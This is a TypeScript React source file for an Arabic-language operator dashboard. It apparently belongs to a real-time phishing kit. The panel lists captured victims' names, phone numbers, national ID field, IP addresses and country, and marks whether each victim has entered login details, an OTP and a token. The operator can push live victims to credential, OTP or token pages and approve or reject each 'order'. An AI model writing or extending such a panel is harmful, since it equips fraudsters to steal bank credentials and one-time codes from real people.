import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { LogOut, RefreshCw, Eye, Send, Users, Clock } from "lucide-react";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";

interface Order {
  id: number;
  fullName: string;
  phoneNumber: string;
  email: string;
  country: string;
  ipAddress: string;
  currentPage: string;
  status: string;
  personalDataCompleted: boolean;
  loginCompleted: boolean;
  otpCompleted: boolean;
  tokenCompleted: boolean;
  createdAt: Date;
}

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loading, setLoading] = useState(false);
  const [orders, setOrders] = useState<Order[]>([]);
  const [activeVisitors, setActiveVisitors] = useState(0);
  const [selectedOrder, setSelectedOrder] = useState<Order | null>(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [showRedirectModal, setShowRedirectModal] = useState(false);
  const [redirectPage, setRedirectPage] = useState("personalData");

  const loginMutation = trpc.admin.login.useMutation();
  const getAllOrdersMutation = trpc.admin.getAllOrders.useQuery();
  const getStatsMutation = trpc.admin.getStats.useQuery();
  const updateStatusMutation = trpc.admin.updateOrderStatus.useMutation();
  const redirectUserMutation = trpc.admin.redirectUser.useMutation();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      await loginMutation.mutateAsync({ password });
      setIsAuthenticated(true);
      setPassword("");
      toast.success("تم تسجيل الدخول بنجاح");
      // تحديث البيانات بعد تسجيل الدخول
      setTimeout(() => {
        getAllOrdersMutation.refetch();
        getStatsMutation.refetch();
      }, 500);
    } catch (error) {
      toast.error("كلمة المرور غير صحيحة");
    } finally {
      setLoading(false);
    }
  };

  const loadDashboardData = async () => {
    try {
      // استدعاء الـ queries مباشرة
      if (getAllOrdersMutation.data) {
        setOrders(getAllOrdersMutation.data as Order[]);
      }
      if (getStatsMutation.data) {
        setActiveVisitors(getStatsMutation.data.activeVisitors);
      }
    } catch (error) {
      console.error("Error loading data:", error);
    }
  };

  useEffect(() => {
    if (isAuthenticated) {
      const interval = setInterval(() => {
        getAllOrdersMutation.refetch();
        getStatsMutation.refetch();
      }, 5000); // تحديث كل 5 ثوان
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  useEffect(() => {
    if (getAllOrdersMutation.data) {
      setOrders(getAllOrdersMutation.data as Order[]);
    }
  }, [getAllOrdersMutation.data]);

  useEffect(() => {
    if (getStatsMutation.data) {
      setActiveVisitors(getStatsMutation.data.activeVisitors);
    }
  }, [getStatsMutation.data]);

  const handleLogout = () => {
    setIsAuthenticated(false);
    setPassword("");
    setOrders([]);
    setActiveVisitors(0);
  };

  const handleShowDetails = (order: Order) => {
    setSelectedOrder(order);
    setShowDetailsModal(true);
  };

  const handleShowRedirect = (order: Order) => {
    setSelectedOrder(order);
    setRedirectPage("personalData");
    setShowRedirectModal(true);
  };

  const handleRedirect = async () => {
    if (!selectedOrder) return;
    try {
      await redirectUserMutation.mutateAsync({
        id: selectedOrder.id,
        page: redirectPage as any,
      });
      toast.success("تم إعادة التوجيه بنجاح");
      setShowRedirectModal(false);
      getAllOrdersMutation.refetch();
      getStatsMutation.refetch();
    } catch (error) {
      toast.error("فشل إعادة التوجيه");
    }
  };

  const handleApprove = async (order: Order) => {
    try {
      await updateStatusMutation.mutateAsync({
        id: order.id,
        status: "approved",
      });
      toast.success("تم قبول الطلب");
      getAllOrdersMutation.refetch();
      getStatsMutation.refetch();
    } catch (error) {
      toast.error("فشل تحديث الحالة");
    }
  };

  const handleReject = async (order: Order) => {
    try {
      await updateStatusMutation.mutateAsync({
        id: order.id,
        status: "rejected",
      });
      toast.success("تم رفض الطلب");
      getAllOrdersMutation.refetch();
      getStatsMutation.refetch();
    } catch (error) {
      toast.error("فشل تحديث الحالة");
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case "completed":
        return "bg-green-100 text-green-800";
      case "approved":
        return "bg-blue-100 text-blue-800";
      case "rejected":
        return "bg-red-100 text-red-800";
      default:
        return "bg-yellow-100 text-yellow-800";
    }
  };

  const getStepStatus = (completed: boolean) => {
    return completed ? "✓" : "-";
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/10 to-background flex items-center justify-center" dir="rtl">
        <Card className="p-8 max-w-md w-full mx-4">
          <h1 className="text-3xl font-bold mb-2 text-center">لوحة تحكم المشرف</h1>
          <p className="text-center text-muted-foreground mb-8">أدخل كلمة المرور للمتابعة</p>
          
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <label className="form-label">كلمة المرور</label>
              <Input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="أدخل كلمة المرور"
                className="input-field"
                required
              />
            </div>
            <Button
              type="submit"
              className="w-full button-primary"
              disabled={loading}
            >
              {loading ? "جاري المعالجة..." : "تسجيل الدخول"}
            </Button>
          </form>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      {/* الهيدر */}
      <header className="header-nav sticky top-0 z-40">
        <div className="container flex items-center justify-between">
          <h1 className="text-2xl font-bold text-accent">لوحة تحكم المشرف</h1>
          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              onClick={() => {
                getAllOrdersMutation.refetch?.();
                getStatsMutation.refetch?.();
              }}
              className="gap-2"
            >
              <RefreshCw className="w-4 h-4" />
              تحديث
            </Button>
            <Button
              variant="destructive"
              onClick={handleLogout}
              className="gap-2"
            >
              <LogOut className="w-4 h-4" />
              تسجيل خروج
            </Button>
          </div>
        </div>
      </header>

      {/* المحتوى */}
      <div className="container py-8">
        {/* الإحصائيات */}
        <div className="grid grid-cols-1  gap-6 mb-8">
          <Card className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-muted-foreground mb-1">الزيارات النشطة</p>
                <p className="text-4xl font-bold text-accent">{activeVisitors}</p>
              </div>
              <Users className="w-12 h-12 text-accent/20" />
            </div>
          </Card>
          <Card className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-muted-foreground mb-1">إجمالي الطلبات</p>
                <p className="text-4xl font-bold text-accent">{orders.length}</p>
              </div>
              <Clock className="w-12 h-12 text-accent/20" />
            </div>
          </Card>
        </div>

        {/* جدول الطلبات */}
        <Card className="overflow-hidden">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>الدولة</TableHead>
                  <TableHead>البيانات</TableHead>
                  <TableHead>الوقت</TableHead>
                  <TableHead>الدخول</TableHead>
                  <TableHead>OTP</TableHead>
                  <TableHead>Token</TableHead>
                  <TableHead>الحالة</TableHead>
                  <TableHead>الإجراءات</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {orders.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={8} className="text-center py-8 text-muted-foreground">
                      لا توجد طلبات حالياً
                    </TableCell>
                  </TableRow>
                ) : (
                  orders.map((order) => (
                    <TableRow key={order.id}>
                      <TableCell>{order.country || "مصر"}</TableCell>
                      <TableCell>
                        <div className="text-sm">
                          <p className="font-semibold">{order.fullName}</p>
                          <p className="text-muted-foreground">{order.phoneNumber}</p>
                        </div>
                      </TableCell>
                      <TableCell className="text-sm">
                        {new Date(order.createdAt).toLocaleString("ar-EG")}
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline">
                          {getStepStatus(order.loginCompleted)}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline">
                          {getStepStatus(order.otpCompleted)}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline">
                          {getStepStatus(order.tokenCompleted)}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <Badge className={getStatusColor(order.status)}>
                          {order.status === "completed" && "مكتمل"}
                          {order.status === "approved" && "موافق عليه"}
                          {order.status === "rejected" && "مرفوض"}
                          {order.status === "pending" && "قيد الانتظار"}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleShowDetails(order)}
                            className="gap-1"
                          >
                            <Eye className="w-4 h-4" />
                            التفاصيل
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleShowRedirect(order)}
                            className="gap-1"
                          >
                            <Send className="w-4 h-4" />
                            إعادة
                          </Button>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </div>

      {/* نافذة التفاصيل */}
      <Dialog open={showDetailsModal} onOpenChange={setShowDetailsModal}>
        <DialogContent dir="rtl" className="max-w-md">
          <DialogHeader>
            <DialogTitle>تفاصيل العميل</DialogTitle>
          </DialogHeader>
          {selectedOrder && (
            <div className="space-y-6">
              <div>
                <h4 className="font-bold mb-3">معلومات الاتصال</h4>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الاسم الكامل:</span>
                    <span>{selectedOrder.fullName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الرقم القومي:</span>
                    <span>{selectedOrder.email}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">رقم الهاتف:</span>
                    <span>{selectedOrder.phoneNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">البريد الإلكتروني:</span>
                    <span className="text-xs">{selectedOrder.email}</span>
                  </div>
                </div>
              </div>

              <div>
                <h4 className="font-bold mb-3">معلومات إضافية</h4>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الدولة:</span>
                    <span>{selectedOrder.country}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">IP:</span>
                    <span className="text-xs">{selectedOrder.ipAddress}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">الصفحة الحالية:</span>
                    <span>{selectedOrder.currentPage}</span>
                  </div>
                </div>
              </div>

              <div className="flex gap-3 pt-4">
                <Button
                  variant="outline"
                  onClick={() => handleReject(selectedOrder)}
                  className="flex-1"
                >
                  رفض
                </Button>
                <Button
                  onClick={() => handleApprove(selectedOrder)}
                  className="flex-1 button-primary"
                >
                  قبول
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* نافذة إعادة التوجيه */}
      <Dialog open={showRedirectModal} onOpenChange={setShowRedirectModal}>
        <DialogContent dir="rtl" className="max-w-md">
          <DialogHeader>
            <DialogTitle>إعادة توجيه المستخدم</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <label className="form-label">اختر الصفحة:</label>
              <Select value={redirectPage} onValueChange={setRedirectPage}>
                <SelectTrigger className="input-field">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="personalData">البيانات الشخصية</SelectItem>
                  <SelectItem value="login">تسجيل الدخول</SelectItem>
                  <SelectItem value="otp">رمز OTP</SelectItem>
                  <SelectItem value="token">رمز Token</SelectItem>
                  <SelectItem value="loading">التحميل</SelectItem>
                  <SelectItem value="success">النجاح</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex gap-3">
              <Button
                variant="outline"
                onClick={() => setShowRedirectModal(false)}
                className="flex-1"
              >
                إلغاء
              </Button>
              <Button
                onClick={handleRedirect}
                className="flex-1 button-primary"
              >
                إعادة توجيه
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
